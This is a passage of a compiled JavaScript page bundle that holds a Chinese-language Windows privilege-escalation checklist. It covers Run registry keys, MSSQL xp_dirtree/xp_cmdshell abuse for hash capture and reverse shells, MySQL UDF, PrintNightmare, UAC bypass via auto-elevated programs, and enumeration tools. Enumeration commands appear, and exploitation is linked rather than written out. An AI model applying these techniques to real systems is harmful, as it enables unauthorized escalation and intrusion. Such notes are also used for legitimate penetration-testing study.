"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'}),"\u3010\uff081\uff09\u6709\u6ce8\u518c\u8868\u5199\u6743\u9650\u65f6\uff0c\u53ef\u4ee5\u5728\u6b64\u952e\u4e0b\u9762\u521b\u5efa\u65b0\u952e\uff1b\uff082\uff09\u89c2\u5bdf\u5176\u4e2d\u7684\u5b50\u952e\u7a0b\u5e8f\u8def\u5f84\uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728",(0,l.jsx)(e.strong,{children:"\u5f31\u76ee\u5f55\u6743\u9650"}),"\u6216",(0,l.jsx)(e.strong,{children:"\u7a0b\u5e8f\u8def\u5f84\u672a\u5f15\u7528"}),"\u7684\u95ee\u9898\u3002\u3011"]}),"\n"]}),"\n",(0,l.jsxs)(e.blockquote,{children:["\n",(0,l.jsx)(e.p,{children:"\u6ce8: \u4e0a\u8ff0\u6ce8\u518c\u8868\u8def\u5f84\u4e2d\u4e0e Run \u540c\u8def\u5f84\u4e0b\u7684\u5176\u5b83\u952e RunOnce\u3001R\u3001Runex\u3001Runonceex \u4ea6\u503c\u5f97\u5173\u6ce8\u3002RunOnce \u5b50\u952e\u4e2d\u7684\u7a0b\u5e8f\u5728\u6267\u884c\u4e00\u6b21\u4e4b\u540e\uff0c\u8be5\u5b50\u952e\u4fbf\u88ab\u5220\u9664\u4e86\u3002"}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\u67d2---\u670d\u52a1\u7a0b\u5e8f",children:(0,l.jsx)("div",{id:"id7",children:"\u67d2 - \u670d\u52a1\u7a0b\u5e8f"})}),"\n",(0,l.jsxs)(e.blockquote,{children:["\n",(0,l.jsxs)(e.p,{children:["\u5728\u6b64\u4e4b\u524d\uff0c\u9996\u5148\u901a\u8fc7\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:" netstat -anop tcp | findstr.exe LISTENING"})," \u786e\u5b9a\u5728\u6b64\u7cfb\u7edf\u4e2d\u6709\u54ea\u4e9b\u8fd0\u884c\u7684\u670d\u52a1\u53ef\u80fd\u662f\u6211\u4eec\u611f\u5174\u8da3\u7684\u3002"]}),"\n"]}),"\n",(0,l.jsx)(e.h4,{id:"1mssql",children:(0,l.jsx)("div",{id:"id7.1",children:"1\u3001MSSQL"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u5229\u7528\u573a\u666f1\uff1a\uff081\uff09\u62e5\u6709\u6570\u636e\u5e93\u767b\u5f55\u8d26\u6237\uff0c\u4e14\u80fd\u6267\u884c xp_dirtree \u6307\u4ee4\u3002\uff082\uff09\u5c1d\u8bd5\u901a\u8fc7responder \u6355\u83b7 MSSQL \u670d\u52a1\u8d26\u6237\u7684 NetNTLMv2 \u54c8\u5e0c\u503c\u8fdb\u884c\u7834\u89e3\u5c1d\u8bd5\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18757951#id3",children:"\u5229\u7528\u65b9\u6cd5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u5229\u7528\u573a\u666f2\uff1a\uff081\uff09\u62e5\u6709\u6570\u636e\u5e93\u7ba1\u7406\u5458\u8d26\u6237 sa\u3002\uff082\uff09\u901a\u8fc7 xp_cmdshell \u6307\u4ee4\u83b7\u5f97\u670d\u52a1\u8d26\u6237\u6743\u9650\u7684 shell \u53cd\u5411\u8fde\u63a5\u3002\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18757951#id3",children:"\u5229\u7528\u65b9\u6cd5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:[(0,l.jsx)(e.strong,{children:"\u6ce8\u610f"}),"\uff1a\uff081\uff09\u83b7\u5f97\u7684\u4efb\u4f55 MSSQL \u6570\u636e\u5e93\u8d26\u6237\u90fd\u503c\u5f97\u53bb\u5c1d\u8bd5\u662f\u5426\u6709\u6743\u9650\u53bb\u6267\u884c xp_dirtree\u3001xp_cmdshell \u6307\u4ee4\uff0c\u56e0\u4e3a\u6743\u9650\u5206\u914d\u4e0d\u4e25\u8c28\u7684\u95ee\u9898\u65f6\u6709\u53d1\u751f\u3002\uff082\uff09\u4efb\u4f55\u670d\u52a1\u8d26\u6237\u7684 Se \u7279\u6743\u90fd\u53ef\u80fd\u6bd4\u666e\u901a\u8d26\u6237\u8981\u591a\uff0c\u6545\u7a81\u7834\u70b9\u4e5f\u4f1a\u53d8\u591a\uff0c\u56e0\u6b64\u4efb\u4f55\u670d\u52a1\u8d26\u6237\u7684\u83b7\u5f97\u90fd\u53ef\u80fd\u4f1a\u51fa\u73b0\u610f\u5916\u60ca\u559c\u3002"]}),"\n"]}),"\n",(0,l.jsx)(e.h4,{id:"2mysql-udf",children:(0,l.jsx)("div",{id:"id7.2",children:"2\u3001MySQL UDF"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u5229\u7528\u6761\u4ef6\uff1a(1) mysqld \u8fdb\u7a0b\u4ee5\u7ba1\u7406\u5458\u6216 SYSTEM \u8eab\u4efd\u8fd0\u884c\u3002(2) \u62e5\u6709\u9ad8\u6743\u9650\u7684\u6570\u636e\u5e93\u767b\u5f55\u8d26\u6237\uff0c\u5982 root\u3002(3) mysql \u7248\u672c\u7b26\u5408 4.x/5.x/[6.x?]\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:"mysql -V"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u5229\u7528\u65b9\u6cd5\uff1a",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18254942",children:"\u53c2\u8003\u94fe\u63a51"}),"\u3001",(0,l.jsx)(e.a,{href:"https://xz.aliyun.com/t/2199?time__1311=n4%2Bxni0%3DE4BD0Djx0ykfDuexgDmEpnnerzoD",children:"\u53c2\u8003\u94fe\u63a52"}),"\u3002"]}),"\n",(0,l.jsx)(e.li,{children:"\u83b7\u53d6\u65b9\u5f0f\uff1a\u547d\u4ee4 ``searchsploit mysql udf`\uff0cid1518\u3002"}),"\n"]}),"\n",(0,l.jsx)(e.h4,{id:"3printnightmare",children:(0,l.jsx)("div",{id:"id7.3",children:"3\u3001PrintNightmare"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsxs)(e.li,{children:["\u5229\u7528\u573a\u666f1-RCE\uff1a\uff081\uff09\u62e5\u6709\u4e00\u4e2a\u6807\u51c6\u7528\u6237\u51ed\u8bc1\u3002\uff082\uff09\u8fdc\u7a0b\u679a\u4e3e Print Spooler \u670d\u52a1\u6b63\u5728\u8fd0\u884c\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:"rpcdump.py @1.1.1.1 | egrep 'MS-RPRN|MS-PAR'"}),"\u3011\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18753135#id1",children:"\u5229\u7528\u65b9\u6cd5"}),"\u3011"]}),"\n",(0,l.jsxs)(e.li,{children:["\u5229\u7528\u573a\u666f2-LPE\uff1a\u672c\u5730\u68c0\u67e5 Print Spooler \u670d\u52a1\u6b63\u5728\u8fd0\u884c\u3002\u3010\u547d\u4ee4 ",(0,l.jsx)(e.code,{children:"sc query Spooler"})," \u3011\u3010",(0,l.jsx)(e.a,{href:"https://www.cnblogs.com/kqdssheng/p/18753135#id2",children:"\u5229\u7528\u65b9\u6cd5"}),"\u3011"]}),"\n"]}),"\n",(0,l.jsx)(e.h4,{id:"4\u4e0d\u5b89\u5168\u7684-gui-\u7a0b\u5e8f",children:(0,l.jsx)("div",{id:"id7.4",children:"4\u3001\u4e0d\u5b89\u5168\u7684 GUI \u7a0b\u5e8f"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:"\u5229\u7528\u6761\u4ef6\uff1a\uff081\uff09\u5df2\u83b7\u5f97 GUI \u4ea4\u4e92\u754c\u9762\u3002\uff082\uff09\u641c\u5bfb\u90a3\u4e9b\u9ed8\u8ba4\u4ee5 auto-elevated \u9ad8\u6743\u9650\u8fd0\u884c\u7684\u7a0b\u5e8f\u3002"}),"\n",(0,l.jsxs)(e.li,{children:["\u503c\u5f97\u5c1d\u8bd5\u7684\u7a0b\u5e8f\u63a8\u8350\uff1a","\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:"CompMgmtLauncher.exe"}),"\n",(0,l.jsx)(e.li,{children:"eventvwr.exe"}),"\n",(0,l.jsx)(e.li,{children:"taskschd.msc"}),"\n",(0,l.jsx)(e.li,{children:"\u63a7\u5236\u9762\u677f-\u7591\u96be\u89e3\u7b54-\u5e2e\u52a9\u548c\u652f\u6301-\u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u7a97\u53e3\u3002\u3010win7 \u4e4b\u524d\u6709\u8be5\u529f\u80fd\uff0cwin0 \u5df2\u79fb\u9664\u3002\u3011"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(e.blockquote,{children:["\n",(0,l.jsx)(e.p,{children:"\u6ce8\uff1a\u8fd9\u4e9b\u7a0b\u5e8f\u53ef\u80fd\u5e76\u4e0d\u80fd\u591f\u6210\u529f\u63d0\u6743\uff0c\u4f46\u5b83\u4eec\u8fd8\u6709\u53e6\u4e00\u4e2a\u4f5c\u7528\u662f\u53ef\u4ee5\u8fdb\u884c UAC \u7ed5\u8fc7\u3002\u867d\u7136\u5f88\u9e21\u808b\uff0c\u4f46\u8fd9\u4e2a\u6280\u5de7\u8fd8\u662f\u503c\u5f97\u4fdd\u7559\u3002"}),"\n"]}),"\n",(0,l.jsx)(e.h2,{id:"\u634c---\u81ea\u52a8\u5316\u5de5\u5177",children:(0,l.jsx)("div",{id:"id8",children:"\u634c - \u81ea\u52a8\u5316\u5de5\u5177"})}),"\n",(0,l.jsxs)(e.ol,{children:["\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/peass-ng/PEASS-ng",children:"PEASS-ng"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",children:"PowerUp"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/GhostPack/Seatbelt",children:"Seatbelt"})}),"\n",(0,l.jsx)(e.li,{children:(0,l.jsx)(e.a,{href:"https://github.com/itm4n/PrivescCheck",children:"PrivescCheck"})}),"\n"]})]})}function x(n={}){const{wrapper:e}={...(0,d.R)(),...n.components};return e?(0,l.jsx)(e,{...n,children:(0,l.jsx)(o,{...n})}):o(n)}}}]);